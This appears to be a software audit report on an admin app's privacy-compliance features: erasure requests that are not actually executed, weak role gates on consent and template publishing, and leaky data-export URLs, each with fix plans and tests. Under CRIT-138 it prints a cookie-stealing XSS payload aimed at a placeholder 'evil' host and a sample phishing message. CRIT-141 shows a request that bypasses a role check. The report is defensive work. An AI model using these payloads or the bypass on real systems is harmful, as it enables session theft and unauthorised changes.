# Phase F Findings Part 4 — Admin compliance / data-rights / NPC / DPO / BIR / notification templates

## Files read (full reads, no skipped sections)

| File | Lines | Read range | Status |
|---|---:|---|---|
| `apps/admin/src/pages/CompliancePage.tsx` | 812 | 1-812 | full |
| `apps/admin/src/pages/ConsentVersionsPage.tsx` | 329 | 1-329 | full |
| `apps/admin/src/pages/DataProtectionLogPage.tsx` | 605 | 1-605 | full |
| `apps/admin/src/pages/NotificationTemplatesPage.tsx` | 397 | 1-397 | full |
| **F04 page total** | **2,143** | | |

Server routes cross-checked (full reads):
- `packages/api/src/routes/compliance-admin.routes.ts` (348)
- `packages/api/src/routes/compliance.routes.ts` (56)
- `packages/api/src/routes/notification-template.routes.ts` (110)
- `packages/api/src/routes/breach-log.routes.ts` (86)

**F04 grand total fully read: ~2,743 lines.**
**Audit grand total fully read after F04: ~66,183 lines (~47.1% of ~140,380 codebase).**

---

## Honesty notes up front

- F04 added **6 new CRITs** (CRIT-136 through CRIT-141) and **20 new MEDs** (MED-321 through MED-340).
- **The biggest finding by far is CRIT-136**: the Data Protection Log page literally tells the DPO that "Mark Complete" does NOT actually delete the customer's data. The server's `markDsrComplete` writes status='completed' regardless of whether erasure happened. This is a NPC RA 10173 §16(d) violation. The platform technically reports compliance with erasure requests while keeping the data.
- Consent search IS DPO-gated server-side (Bug 402 fix verified in Phase 14 D08). But consent VERSION publish is `requireAdmin` only — junior admin can publish a new privacy_policy version that forces all customers to re-consent. CRIT-137.
- Tax Documents tab + Regulatory Reports tab in CompliancePage are STUBS shipped to production. Buttons that do nothing. The toast even says "ETA Phase 14" which is already complete.
- BreachLog API endpoints exist (DPO-gated correctly) but there is NO admin UI for them. Per Bug 1366 (Phase 14 D08) the breach log is API-only — DPO has to use curl. MED.
- F04 also confirmed CRIT-135 (audit log secret leak) extends here: CompliancePage AuditTab repeats the same raw `oldValues`/`newValues` JSON display. The CSV export endpoint is itself audited (good), but the CSV content is not redacted.

---

## CRITICAL bugs (continuing numbering after CRIT-135)

### CRIT-136 — Erasure DSR "Mark complete" doesn't delete data; UI literally admits it; status flips to "completed" anyway → NPC RA 10173 §16(d) violation
**Files:**
- [apps/admin/src/pages/DataProtectionLogPage.tsx:398-411, 444-458](apps/admin/src/pages/DataProtectionLogPage.tsx#L398)
- [packages/api/src/routes/compliance-admin.routes.ts:240-256](packages/api/src/routes/compliance-admin.routes.ts#L240)

```tsx
// DataProtectionLogPage — line 398-411 — the actual UI text shown to the DPO
{dialog.dsr?.requestType === 'erasure' && (
  <>
    <div role="alert" className="...border-destructive/40 bg-destructive/10...">
      <AlertTriangle size={16} />
      <span>
        This marks the DSR closed. Erasure must be manually executed against
        backend systems &mdash; clicking Mark Complete does NOT delete the
        customer&apos;s data.
      </span>
    </div>
    <Label htmlFor="dpo-erasure-confirm">Type ERASE COMPLETE to confirm</Label>
    <Input value={erasureConfirm} ... placeholder="ERASE COMPLETE" />
  </>
)}
```

```ts
// compliance-admin.routes.ts:240-256 — the server endpoint behind "Mark complete"
router.post(
  '/dsr/:id/complete',
  authMiddleware,
  async (req, res, next) => {
    try {
      requireAdmin(req);  // ← admin OR super_admin, no DPO check
      const data = await complianceAdmin.markDsrComplete({
        dsrId: req.params.id,
        adminUserId: req.user!.userId,
        responsePayloadUrl: typeof body.responsePayloadUrl === 'string' ? body.responsePayloadUrl : undefined,
      });
      res.json({ success: true, data });
    }
  }
);
```

**The flow when a customer requests erasure (right to be forgotten under NPC RA 10173 §16(d)):**

1. Customer (or their representative) submits DSR via mobile/customer-side `/api/v1/compliance/dsr` with `requestType='erasure'`.
2. Row appears in admin DPO queue with status='received', dueAt=+15 days.
3. DPO opens Data Protection Log, clicks Complete on the erasure row.
4. UI shows the warning "Mark Complete does NOT delete the customer's data."
5. DPO types `ERASE COMPLETE`, clicks the button.
6. Server's `complianceAdmin.markDsrComplete` updates `data_subject_requests.status` to `'completed'`, `completed_at = NOW()`.
7. Customer's row in `users`, all related rows in `bookings`, `payments`, `wallet_transactions`, `consent_records`, `audit_log`, `messages`, `addresses`, `reviews`, `referrals`, `disputes` — **all remain in the database, untouched.**
8. The platform reports to NPC (if audited): "DSR #abc completed in 11 days."
9. The customer thinks they're erased. They search by email 6 months later and find their account still exists. Or the platform suffers a breach 12 months later and the "erased" customer's data is exposed because it was never deleted.

**This is NPC RA 10173 §16(d) violation, full stop.** §16(d) says the data subject has the right "to suspend, withdraw or order the blocking, removal or destruction of his or her personal information from the personal information controller's filing system." The platform tells the customer "completed" but doesn't destroy. NPC complaint → fine up to ₱5M per incident + executive criminal liability per RA 10173 §35 (negligent unauthorized processing).

**The fact that this is admitted in the UI text shows the team knew this was broken when shipping.** It is not a misunderstanding — it is a deliberate "we'll fix it later" that became "we shipped it."

**Real-world impact on Boracay launch:** an NPC inquiry will examine completed erasure DSRs. The first audit will find the data still in the DB. NPC formal investigation, public sanction. PayMongo + payment processor will pull processing. Platform shut down.

**Fix dispatch:**
```
1. Build an actual erasure executor:
   POST /api/v1/admin/compliance/dsr/:id/erase
   - DPO-only (use requireDpoRole, not requireAdmin).
   - Server enumerates all tables containing PII for the user, deletes:
     * users (or anonymizes — see option 2)
     * bookings (anonymize customer_id → 'erased-<hash>')
     * payments (keep for BIR 5-year retention; anonymize PII columns only)
     * wallet_transactions (keep for accounting; anonymize description)
     * consent_records (delete)
     * messages (delete or anonymize sender names)
     * addresses (delete)
     * reviews (anonymize reviewer name to "Erased user")
     * audit_log (anonymize user_email to "[ERASED]"; keep IDs for traceability)
   - Two strategies:
     a) Hard delete for non-financial rows + anonymize for BIR-required rows.
     b) Crypto-shred: encrypt all user PII at rest with per-user key; deletion = destroy that key.
   - For Boracay launch, strategy (a) is faster to implement.

2. Erasure DSR completion FLOW:
   a. DPO clicks Complete on erasure DSR.
   b. Server queues the erasure job (background worker).
   c. Server updates DSR status to 'in_progress' (NOT completed yet).
   d. Worker executes erasure plan (idempotent, transactional).
   e. Worker writes audit_log row: 'erasure_executed' with table-by-table count.
   f. Worker updates DSR status to 'completed' ONLY after all PII is removed.
   g. Worker emails the customer: "Your erasure request has been processed. ID: <DSR_ID>."

3. Block the current "Mark Complete" path for erasure type:
   - In markDsrComplete, if dsr.requestType === 'erasure' AND no erasureExecution row exists → 422 "Use /erase endpoint, not /complete."
   - Update DataProtectionLogPage to call /erase for erasure type, /complete for everything else.

4. Migration: backfill audit_log "this row was previously claimed completed but data still exists" for any past erasure DSRs that hit /complete pre-fix. Soft-flag for re-processing.

5. Tests:
   - Integration: customer creates user, files erasure DSR, DPO calls /erase, asserts:
     * users row gone (or anonymized)
     * customer's email not present in any joined query
     * audit_log row 'erasure_executed' written
     * DSR status='completed'
   - Integration: customer creates user, DPO calls /complete on erasure DSR → 422.
   - Test that bookings/payments retention preserves accounting integrity (totals match).

6. Documentation: write docs/runbooks/erasure-execution.md explaining the table-by-table strategy and BIR 5-year retention exception.

7. Bundle into the launch-blocking dispatch list. Without this, the platform cannot legally claim NPC compliance.
```

**Tests required:**
- `compliance-admin.service.real.test.ts` — `markDsrComplete()` must reject `requestType='erasure'` with a 422.
- New file `erasure-executor.real.test.ts` — full integration test that creates a user + bookings + payments, runs erasure, asserts every PII-containing column is anonymized or gone.
- `DataProtectionLogPage.real.test.tsx` — assert the "ERASE COMPLETE" dialog now shows "Submit for execution" + actually fires the new /erase endpoint.

**Runtime verification (AI coder runbook):**
1. `docker compose up api admin postgres redis worker`
2. Apply new migration: `089_erasure_executions.sql` (creates `erasure_executions` table tracking what was deleted per DSR).
3. Seed: `customer-erasure-test@onservice.us`, give them 3 bookings, 1 dispute, 5 wallet transactions, 2 reviews.
4. Customer files erasure DSR via API: `POST /api/v1/compliance/dsr {requestType: 'erasure', userMessage: 'I want my data deleted'}`.
5. DPO logs in, opens Data Protection Log, clicks Erase on the DSR.
6. Page calls new `/erase` endpoint; UI shows "Erasure queued — status will update when executor finishes."
7. Worker runs erasure (within 60s in dev).
8. Verify in DB:
   - `SELECT email FROM users WHERE id='<erased-id>'` → returns NULL or anonymized.
   - `SELECT * FROM bookings WHERE customer_id='<erased-id>'` → customer_id is now 'erased-<sha256-prefix>', personal columns nulled.
   - `SELECT * FROM audit_log WHERE entity_id='<erased-id>'` → entries kept but user_email='[ERASED]'.
   - `SELECT * FROM erasure_executions WHERE dsr_id='<id>'` → 1 row showing per-table counts.
9. Customer support agent searches by original email → no results.
10. Email log shows the customer received "Your data has been erased" notification.

---

### CRIT-137 — `POST /admin/compliance/consent-versions` (publish a new consent version) gated by `requireAdmin` only; junior admin can force every customer to re-consent
**Files:**
- [apps/admin/src/pages/ConsentVersionsPage.tsx:97-117, 186-191](apps/admin/src/pages/ConsentVersionsPage.tsx#L97)
- [packages/api/src/routes/compliance-admin.routes.ts:329-346](packages/api/src/routes/compliance-admin.routes.ts#L329)

```ts
// compliance-admin.routes.ts:329-346
router.post(
  '/consent-versions',
  authMiddleware,
  async (req, res, next) => {
    try {
      requireAdmin(req);  // ← admin OR super_admin — NOT super_admin or DPO
      const data = await complianceAdmin.publishConsentVersion({...});
      res.status(201).json({ success: true, data });
    }
  }
);
```

```tsx
// ConsentVersionsPage.tsx:186-191 — no client role check
<Button
  onClick={() => setPublishOpen(true)}
  aria-label="Publish a new consent version"
>
  Publish new version
</Button>
```

The dialog itself reminds the admin that "Existing user consents are NOT automatically revoked — users will be prompted to re-consent on next interaction with the affected surface." This is a platform-wide legal artifact. Publishing a new `privacy_policy` v1.5 forces every customer and provider to re-accept terms before the next booking, payment, or login.

**Real-world impact:**
- Junior admin (intended permissions: support tickets) navigates to /consent-versions out of curiosity, types `consentType=privacy_policy`, `version=99.99`, `effectiveAt=2020-01-01`, `changeSummary="testing the form"`, and clicks Publish.
- All 1,000 customers and 100 providers are now prompted to re-consent.
- Booking flow blocked for everyone for the next 24 hours.
- Customer trust collapses ("why did I just get a privacy policy popup with garbage version 99.99?").
- Reverting requires a super-admin to manually delete the row + clear consent_versions cache.
- No undo button in the UI.
- **Possible legal exposure**: if v99.99 was technically published, did existing v1.4 consents become invalid? NPC may rule that consent has been formally retracted by the platform.

This must be **DPO-only** at the very least. Better: super_admin OR DPO + co-sign by another super_admin for any change to `privacy_policy` / `terms_of_service` / `marketing_consent` types.

**Fix dispatch:**
```
1. Server (compliance-admin.routes.ts:329-346):
   - Replace `requireAdmin(req)` with `requireDpoRole(req)` (already exists per Bug 402 doctrine).
   - For high-stakes types (privacy_policy, terms_of_service, marketing_consent),
     require co-sign:
       a. First DPO calls POST /consent-versions → status='pending_cosign', notifies all super_admins.
       b. Second super_admin/DPO calls POST /consent-versions/:id/cosign → status='active', cascades to consent system.

2. Server validation:
   - effectiveAt must be in the future (>= now). Reject backdated versions.
   - effectiveAt must be in Asia/Manila timezone (not UTC midnight). Use TZ-aware parsing.
   - changeSummary min 200 chars (currently 30 client-side, server doesn't validate).
   - consentType must be in a server-side allowlist:
       ['privacy_policy', 'terms_of_service', 'marketing_consent', 'cookie_policy', ...]
     Reject typos and free-text variants.

3. Client (ConsentVersionsPage):
   - Add useAuthStore. If !isDpo && !isSuperAdmin, hide the "Publish new version" button + show banner.
   - Replace the free-text consentType Input with a Select that maps to the server allowlist.
   - effectiveAt date input: min={today}, no past dates.
   - Show "This will affect: {customerCount} customers + {providerCount} providers — all will be prompted to re-consent on next interaction" preview before submit.
   - Confirm dialog with typed-CONFIRM string.

4. UNPUBLISH capability:
   - Add /consent-versions/:id/unpublish (super_admin + DPO co-sign).
   - Restores previous version as active.
   - Audit row.

5. Tests:
   - Render ConsentVersionsPage with role='admin' (no DPO) → Publish button hidden.
   - With DPO role → button visible, dialog opens.
   - Server: POST /consent-versions with role='admin' → 403.
   - Server: POST with effectiveAt in past → 422.
   - Server: POST with consentType='privacy_p0licy' (typo) → 422.

6. Bundle with the staff permissions dispatch (CRIT-23/56/120/121/130/131).
```

**Runtime verification:**
1. Seed two admin users: dpo@onservice.us (DPO role), support@onservice.us (admin role only).
2. Log in as support@onservice.us → /consent-versions → "Publish new version" button NOT shown. Banner: "Consent versioning is restricted to the DPO. Contact <name> to publish."
3. Log in as dpo@onservice.us → button visible. Open dialog.
4. Type consentType='privacy_policy', version='1.5', effectiveAt=2020-01-01, changeSummary='test'.
5. Submit → server returns 422 "effectiveAt must be in the future" + 422 "changeSummary must be at least 200 characters".
6. Type effectiveAt=2026-06-01 (future), changeSummary=200+ chars, submit → status='pending_cosign'.
7. Log in as second super_admin, see notification, navigate to /consent-versions, click Co-sign → status='active'.
8. Audit log shows 2 rows: 'consent_version_proposed' + 'consent_version_cosigned'.

---

### CRIT-138 — Notification template editor: ANY admin can edit/create/delete templates with NO role gate, NO XSS sanitization, NO test send, NO preview, NO multi-language support
**Files:**
- [apps/admin/src/pages/NotificationTemplatesPage.tsx:1-397](apps/admin/src/pages/NotificationTemplatesPage.tsx)
- [packages/api/src/routes/notification-template.routes.ts:60-91](packages/api/src/routes/notification-template.routes.ts#L60)

```ts
// notification-template.routes.ts — POST/PUT/DELETE all gated only by requireAdmin
router.post('/', authMiddleware, validationMiddleware(createTemplateSchema), async (req, res, next) => {
  try {
    requireAdmin(req);  // ← admin OR super_admin
    const template = await templateService.createTemplate(req.user!.userId, req.body);
    res.status(201).json({ success: true, data: ... });
  }
});
```

```tsx
// NotificationTemplatesPage.tsx — line 199-213 — edit/delete buttons no role gate
<button onClick={(e) => { e.stopPropagation(); openEdit(r); }}>Edit</button>
<button onClick={(e) => {
  e.stopPropagation();
  if (confirm(`Delete template "${r.slug}"?`)) deleteMutation.mutate(r.id);
}}>Delete</button>
```

**Attack scenarios:**

1. **Phishing via push notification** — junior admin edits the `booking_confirmed` body to:
   ```
   Your booking is confirmed. Verify your card details now: https://malicious.tld/bnk
   ```
   Every customer who books a service receives this push notification. Mass phishing campaign launched from inside the platform. Customer clicks the link, enters their card, money stolen. Platform reputation destroyed.

2. **XSS in email/in-app webview** — admin types `<script>fetch('//evil/'+document.cookie)</script>` into a body. If the email/in-app channel renders HTML, the script runs in the customer's email client or in-app webview. Cookie / session theft.

3. **Mass disabling** — admin clicks the toggle on every template. All notifications turn off. Booking confirmations don't send. Customer thinks the platform is broken.

4. **Slug typo** — admin types `boking_confirmed` (one missing letter), creates a new row. Notification dispatcher uses the original `booking_confirmed` slug. Customers stop getting confirmations because... wait, no, the original is still active. Actually the impact depends on dispatcher logic — but the data is permanently muddied with two similar slugs.

**Real-world impact (Boracay launch):** the platform's outbound communication is the primary trust channel. A single compromised template hits every customer/provider on the next dispatch cycle. Even a non-malicious typo (admin changes "₱100 commission" to "₱1000 commission" in a tier-upgrade template) creates panic.

**Fix dispatch:**
```
1. Server (notification-template.routes.ts:60-108):
   - POST/PUT/DELETE → requireSuperAdmin (or new perm 'templates.edit').
   - GET → requireAdmin (read-only).
   - Validate body against an allowlist of HTML tags (or strip all HTML if push/SMS).
   - Validate variables against a server-registered list per template type.
     E.g., booking_update can use: {{bookingId}}, {{providerName}}, {{scheduledTime}}, {{customerName}}, {{totalAmount}}, {{categoryName}}.
     Reject any template that references undefined variables.
   - Validate length:
     - Push notification body: max 178 chars (Apple Push limit).
     - SMS body: max 160 chars.
     - Email subject: max 78 chars (RFC 5322 recommendation).
     - Email body: max 5000 chars (defensive).

2. Server: enforce locale support:
   - New columns: `locale` ('en' | 'tl' default 'en'), unique on (slug, channel, locale).
   - Boracay launch must have BOTH 'en' AND 'tl' versions for every customer-facing template.

3. Client (NotificationTemplatesPage):
   - Hide Edit/Delete/Toggle buttons for non-super-admin.
   - Add "Test send" button — fires the template to the current admin's email/phone.
   - Add "Preview" button — renders the template with mock variables to show what customer would see.
   - Add multi-language tabs: en / tl.
   - Slug validation: require lowercase + underscore only, exists check (warn on near-duplicates).
   - Variable validation: type-aware list shown alongside the editor.

4. Add publish workflow for high-stakes channels:
   - Edit template → status='draft'.
   - Submit for review → status='pending_approval'.
   - Second super_admin approves → status='active' (cascades to dispatcher).
   - For push/sms/email, require this 2-person flow. For in_app, single edit OK.

5. Audit row on every template change with diff (old vs new body).

6. Tests:
   - Render with role='admin' → New Template button missing, Edit/Delete missing.
   - Submit body containing `<script>` → server returns 422.
   - Submit body referencing {{undefinedVar}} → 422.
   - Submit body 200 chars to push channel (max 178) → 422.
   - Test-send fires the template to admin's email.
```

**Runtime verification:**
1. Log in as junior admin (`role='admin'`), navigate to /notification-templates → Edit/Delete/Toggle buttons NOT shown.
2. Log in as super_admin → buttons visible.
3. Click New Template, type slug='test_template', body='<script>alert(1)</script>', submit → 422 "HTML tags not allowed in body".
4. Type body='Hello {{undefinedVar}}', submit → 422 "Variable undefinedVar not registered for template type X".
5. Type valid body, click Test Send → admin receives push/email/SMS to their seeded contact.
6. Type body referencing valid variables, click Preview → modal shows rendered notification with mock data.
7. Verify locale='tl' tab exists; submit Tagalog version of same template.

---

### CRIT-139 — `consentType` and `version` are FREE TEXT in the publish dialog; typos create permanent duplicate consent types in DB; `effectiveAt` accepts retroactive dates
**Files:**
- [apps/admin/src/pages/ConsentVersionsPage.tsx:252-261, 269-279, 281-287, 313-318](apps/admin/src/pages/ConsentVersionsPage.tsx#L252)
- [packages/api/src/routes/compliance-admin.routes.ts:329-346](packages/api/src/routes/compliance-admin.routes.ts#L329) — server doesn't validate either

```tsx
// ConsentVersionsPage.tsx:252-261 — consentType is free-text Input
<Input
  id="cv-type"
  list="cv-known-types"  // ← datalist, not a closed dropdown
  value={consentType}
  onChange={(e) => setConsentType(e.target.value)}
  placeholder="e.g., privacy_policy"
  maxLength={50}
/>
```

The `list="cv-known-types"` makes the input a *suggestion-enhanced* text input, NOT a closed dropdown. Admin can type anything. Submitted to server via `POST /consent-versions { consentType: <free text> }`. Server (line 338) accepts: `consentType: typeof body.consentType === 'string' ? body.consentType : ''`. No allowlist validation.

**Typo scenarios:**

1. Admin types `privacy_p0licy` (zero instead of o). Server accepts. Now there's a `privacy_policy` row AND a `privacy_p0licy` row. Existing customers consented under `privacy_policy`. The new typo'd version doesn't apply to anyone, but it sits in the registry forever as a confusing artifact.

2. Admin types `Privacy Policy` (Title Case + space). Server stores `Privacy Policy`. Existing consents are stored under `privacy_policy`. Now consent_records contain consents for two different "types" that are semantically identical. NPC traceability lost.

3. Admin types `terms_of_service` correctly but `version='1.0a'`. Server stores it. Existing v1.0 consents are unrelated. Customers under v1.0 are not migrated; '1.0a' is effectively a fork.

4. **Retroactive effectiveAt**: input is `<Input type="date">` with no min validation. Admin sets `effectiveDate=2025-01-01` for a version published 2026-05-01. The version is "effective" 16 months ago.
   - Conversion line 314-315: `new Date(effectiveDate + 'T00:00:00Z').toISOString()` = "2025-01-01T00:00:00.000Z".
   - This violates legal principles of policy effectivity. NPC will reject any policy that retroactively binds users.
   - Combined: admin types old version + retroactive date + 30-char summary → server stores it as if customers consented under that version a year ago.

5. **Effective date timezone bug**: `+ 'T00:00:00Z'` gives UTC midnight. For Asia/Manila (UTC+8), this is **8 AM Manila time**, not midnight. Customers in the Manila timezone on the effective date can technically use the OLD version for 8 hours after the new version is "active." Subtle bug, but matters for legal effectivity of a privacy policy.

**Fix dispatch:**
```
1. Server (compliance-admin.routes.ts:329-346 + complianceAdmin.publishConsentVersion):
   - Validate consentType against a server-side allowlist:
     CONSENT_TYPES = ['privacy_policy', 'terms_of_service', 'marketing_consent', 'cookie_policy', 'sms_marketing_consent', ...]
     Reject if not in list. Return 422 with the allowlist for client to display.
   - Validate version format: SemVer (X.Y.Z) or ISO date (YYYY-MM-DD). Reject anything else.
   - Validate effectiveAt:
     - Must be valid ISO 8601.
     - Must be in the future (>= server NOW + 5 minutes — enforce a buffer to allow propagation).
     - Convert from "client local date" to UTC using Asia/Manila offset:
       const dt = new Date(effectiveDate + 'T00:00:00+08:00').toISOString();
   - Validate changeSummary >= 200 chars (currently 30 client-side, 0 server-side).

2. Client (ConsentVersionsPage):
   - Replace free-text consentType Input with Select fed by server's CONSENT_TYPES allowlist.
   - Version Input: pattern enforced (e.g., \d+\.\d+|\d{4}-\d{2}-\d{2}).
   - effectiveDate Input: min={tomorrow's ISO date in Manila}, no past.
   - Convert effectiveDate to Manila-aware ISO before submit.
   - Show preview: "Version v{version} of {type} will become effective {humanDate} Manila time. Estimated affected users: {count}."

3. Migration:
   - Add CHECK constraint on consent_versions.consent_type to enforce allowlist (or use ENUM).
   - Add CHECK constraint on effective_at >= published_at.
   - Identify and quarantine any pre-existing typo rows. Manual cleanup script.

4. Tests:
   - Submit consentType='privacy_p0licy' → 422.
   - Submit version='1.0a' → 422.
   - Submit effectiveAt 2025-01-01 → 422.
   - Submit valid → 201.
```

**Runtime verification:**
1. Log in as DPO, open /consent-versions, click Publish.
2. Type consentType='privacy_p0licy', version='1.0', effectiveDate=tomorrow, changeSummary=200 chars → submit → 422 with message listing valid types.
3. Type valid type, version='abc', → 422 "version must match X.Y or YYYY-MM-DD".
4. Type version='1.5', effectiveDate=2025-01-01 → 422 "effectiveAt must be in the future".
5. Type effectiveDate=tomorrow (2026-05-02) → preview shows "v1.5 of privacy_policy effective 2026-05-02 12:00 AM Manila time."
6. Submit, verify DB row's effective_at = '2026-05-01T16:00:00Z' (= 2026-05-02 00:00 Manila).

---

### CRIT-140 — `responsePayloadUrl` for DSR completion is a plain user-typed URL (no S3 upload, no signed/short-lived URL, no audit on access); customer's full data export leaks via referrer + browser history
**Files:**
- [apps/admin/src/pages/CompliancePage.tsx:377-383](apps/admin/src/pages/CompliancePage.tsx#L377)
- [apps/admin/src/pages/DataProtectionLogPage.tsx:426-440](apps/admin/src/pages/DataProtectionLogPage.tsx#L426)

```tsx
// CompliancePage NpcTab DsrDetailPanel — line 377-383
{newStatus === 'completed' && (
  <div>
    <Label htmlFor="dsr-url">Response payload URL</Label>
    <Input
      id="dsr-url"
      value={responsePayloadUrl}
      onChange={(e) => setResponsePayloadUrl(e.target.value)}
    />
  </div>
)}

// DataProtectionLogPage — line 426-440
<Label htmlFor="dpo-response-url">Response payload URL (optional)</Label>
<Input
  id="dpo-response-url"
  type="url"
  value={responseUrl}
  onChange={(e) => setResponseUrl(e.target.value)}
  placeholder="https://..."
/>
<p className="text-xs text-slate-500 mt-1">
  Link to the file or document delivered to the data subject (e.g., signed S3 URL).
</p>
```

The DPO is supposed to compile the customer's complete data export (every booking, every payment, every consent record, every dispute, every message — likely a 10-100MB ZIP file) and somehow get a URL for it. The DPO then *pastes* the URL into this input.

**Real-world workflow per current code:**
1. DPO manually queries the DB or runs a script to compile the export.
2. DPO uploads the export somewhere (S3? Google Drive? Dropbox? Email attachment?). The platform has no built-in tool.
3. DPO copies the URL.
4. DPO pastes the URL into the admin form.
5. Server stores the URL on `data_subject_requests.response_payload_url`.
6. Customer (somehow notified, also unclear) clicks the URL.
7. The URL leaks via:
   - Browser history (DPO's browser, customer's browser)
   - Referrer headers if the URL is clicked from another page
   - Email forwarding if the customer forwards the response notification
   - Logs (the URL is plain-text in admin_actions audit row, in nginx access logs, in cloud provider request logs)
   - **DPO's clipboard history (OS-level + cloud sync)**

The URL is permanent (no expiry, no rotation). Anyone with the URL can fetch the customer's complete data export indefinitely. **NPC RA 10173 §28 violation.**

**Real-world impact:** customer requests their data via DSR. DPO pastes a Google Drive shareable link. The link is stored in 3 admin's browser histories + the customer's email + the audit log + a Slack message where the DPO discussed it with engineering. 6 months later, an attacker browses one of those locations, copies the link, downloads 10MB of the customer's bookings + payments + addresses + dispute photos. **Data breach.**

**Fix dispatch:**
```
1. Build a real DSR response delivery system:
   - Server endpoint POST /admin/compliance/dsr/:id/upload-response (DPO-only, multipart):
     a. Accepts a multipart file upload (the data export ZIP).
     b. Server uploads to S3 with bucket = "dsr-responses-private" + AWS KMS encryption.
     c. Server stores S3 key (NOT URL) on data_subject_requests.response_s3_key.
     d. Server response: { responseId, expectedSizeBytes, sha256Hash }.

2. Customer-side endpoint to retrieve:
   GET /api/v1/compliance/dsr/:id/response-download (customer-only, must be the requester):
     a. Validates customer.id === dsr.user_id.
     b. Generates a 60-second-TTL S3 presigned URL.
     c. 302 redirects.
     d. Audit row: 'dsr_response_downloaded' with admin/customer ID + IP + user-agent + timestamp.

3. Customer notification email: includes a link to /api/v1/compliance/dsr/:id/response-download (NOT direct S3 URL).

4. Admin UI:
   - Replace the URL paste field with a file upload (file <= 100MB max).
   - On upload success, show "✓ Response delivered. Customer can now download." with link to the audit row.
   - Show a "Re-upload" button (versioned uploads if DPO realizes the first one was wrong).

5. Server retention: keep responses for 30 days post-completion, then purge.

6. Tests:
   - DPO uploads a ZIP to /upload-response → S3 key stored, no public URL.
   - Customer hits /response-download with their JWT → 302 to short-lived presigned URL.
   - Different customer hits the same endpoint → 403.
   - Audit row written on each download.
   - 60s after the redirect, the URL no longer works.

7. Bundle with CRIT-125 (presigned-PDF) and CRIT-128 (KYC docs) into a unified "all PII files go through proxied download" dispatch.
```

**Runtime verification:**
1. Customer files DSR. DPO opens the request.
2. UI shows "Upload response file" instead of "Paste URL."
3. DPO uploads a 5MB ZIP. UI shows "✓ Response delivered."
4. Customer logs in, opens their DSR history, clicks Download.
5. Browser navigates to /api/v1/compliance/dsr/.../response-download → 302 to S3 presigned URL → file downloads.
6. Customer copies the redirect URL, pastes in incognito browser, waits 90 seconds, navigates → AccessDenied (URL expired).
7. Audit log shows: 'dsr_response_uploaded' (by DPO) + 'dsr_response_downloaded' (by customer).

---

### CRIT-141 — Two parallel DSR action endpoints with conflicting contracts; admin/super-admin can use the unfortified PATCH path to circumvent the Phase 13 D08 guards
**Files:**
- [apps/admin/src/pages/CompliancePage.tsx:299-314](apps/admin/src/pages/CompliancePage.tsx#L299) — uses PATCH `/dsr/:id`
- [apps/admin/src/pages/DataProtectionLogPage.tsx:154-208](apps/admin/src/pages/DataProtectionLogPage.tsx#L154) — uses POST `/dsr/:id/{complete,reject,...}`
- [packages/api/src/routes/compliance-admin.routes.ts:138-160 vs 240-310](packages/api/src/routes/compliance-admin.routes.ts#L138)

```ts
// PATCH /dsr/:id — used by CompliancePage NpcTab — line 138-160
router.patch('/dsr/:id', authMiddleware, async (req, res, next) => {
  try {
    requireAdmin(req);  // ← admin OR super_admin
    const data = await compliance.updateDsrStatus({
      id, adminId, newStatus,
      adminNotes, rejectionReason, responsePayloadUrl,
    });
    ...
  }
});

// POST /dsr/:id/reject — used by DataProtectionLogPage — line 276-292
router.post('/dsr/:id/reject', authMiddleware, async (req, res, next) => {
  try {
    requireSuperAdmin(req);  // ← super_admin ONLY
    ...
    rejectDsr({ dsrId, adminUserId, reason });
  }
});

// POST /dsr/:id/escalate — line 294-310
router.post('/dsr/:id/escalate', authMiddleware, async (req, res, next) => {
  try {
    requireSuperAdmin(req);  // ← super_admin ONLY
    ...
  }
});
```

The Phase 13 Dispatch C added the dedicated `/complete`, `/reject`, `/request-info`, `/escalate` endpoints with proper guards (`/reject` and `/escalate` require super_admin). DataProtectionLogPage uses these.

**But the PATCH `/dsr/:id` endpoint is still mounted, accepts arbitrary status changes including `'rejected'`, and only checks `requireAdmin`.** A junior admin can:
```bash
PATCH /api/v1/admin/compliance/dsr/<dsr-id>
Body: {
  newStatus: "rejected",
  rejectionReason: "test",
  adminNotes: "wanted to see if this works"
}
```
Server: 200, status='rejected'. Bypassed the super_admin gate via the PATCH path.

CompliancePage NpcTab actively calls this PATCH endpoint (line 305-307) — so this is not a hypothetical attack, it's an active path used by the live UI for any status change including rejection.

**Real-world impact:** Phase 14 added the proper guarded endpoints, but didn't remove the unguarded PATCH. Junior admin (or anyone who opens DevTools and reads the network tab to learn the API shape) can reject DSRs with one HTTP call. NPC compliance posture = paper-thin.

**Fix dispatch:**
```
1. Server (compliance-admin.routes.ts:138-160):
   - Remove or deprecate PATCH /dsr/:id.
   - If removal breaks CompliancePage NpcTab, update NpcTab to use the dedicated POST endpoints:
     - newStatus='completed' → POST /dsr/:id/complete
     - newStatus='rejected' → POST /dsr/:id/reject
     - newStatus='in_progress' → POST /dsr/:id/request-info OR a new /start-progress endpoint
   - In the interim, hard-gate PATCH to super_admin AND require it to call into the same service functions as the POST endpoints, so business rules are unified.

2. Service unification:
   - Both PATCH and POST should call the same compliance.updateDsrStatus / complianceAdmin.* functions.
   - Add a flag in updateDsrStatus that requires super_admin for status='rejected'. Currently only the route-level requireSuperAdmin enforces it; if a service caller forgets it, the guard is bypassed.

3. Audit row:
   - Every DSR status change writes to admin_actions with the action_type matching the endpoint used.
   - Phase I dispatch can grep audit_log for any 'dsr_status_changed_via_patch' rows and flag them for compliance review.

4. Tests:
   - PATCH /dsr/:id with newStatus='rejected' as junior admin → 403 (post-fix).
   - PATCH /dsr/:id with newStatus='completed' for erasure type as junior admin → 422 (use /erase endpoint, see CRIT-136).
   - POST /dsr/:id/reject as junior admin → 403.

5. Documentation: update API docs to clearly mark PATCH /dsr/:id as deprecated, with migration to POST endpoints.
```

**Runtime verification:**
1. Log in as junior admin.
2. Navigate to /compliance, NPC tab. Click a DSR row, change status dropdown to "rejected", set rejection reason, click Save.
3. Pre-fix: 200 OK, DSR rejected. Confirm in the DataProtectionLogPage queue + DB.
4. Post-fix: 403 "Super-admin required for rejection."
5. Same flow via DataProtectionLogPage Reject button: 403 (already gated correctly).

---

## MEDIUM bugs (continuing from MED-320)

### MED-321 — Tax Documents tab is a STUB (`TODO: pulls from /api/v1/admin/bir/exports (Phase 08)`) shipped to production
**File:** [apps/admin/src/pages/CompliancePage.tsx:750-791](apps/admin/src/pages/CompliancePage.tsx#L750)

The tab renders form controls (year, type) and an EmptyState saying "Not yet wired." Any admin clicking the tab in production sees a non-functional UI. Compliance auditor visiting the platform sees "Tax Documents Archive — Not yet wired."

